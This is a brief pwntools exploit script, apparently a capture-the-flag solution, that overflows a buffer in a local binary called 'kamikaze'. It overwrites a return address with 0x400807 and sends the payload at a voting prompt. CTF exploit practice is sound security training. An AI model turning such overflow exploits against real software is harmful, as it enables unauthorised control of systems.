from pwn import *
from sys import argv
from time import sleep

context.log_level = "debug"

binfile = "./kamikaze"

elf = ELF(binfile)

if len(argv) >= 2 and argv[1] == "d":
    p = gdb.debug(binfile, '''
        break *0x0
        continue
    ''')
else:
    p = process(binfile)

payload = b""
payload += b"A" * 10
payload += p64(0x400807)

p.recvuntil("Vote: ")
p.sendline(payload)

p.recvuntil("Thanks for voting!\n")
print(p.recvline())

#p.interactive()
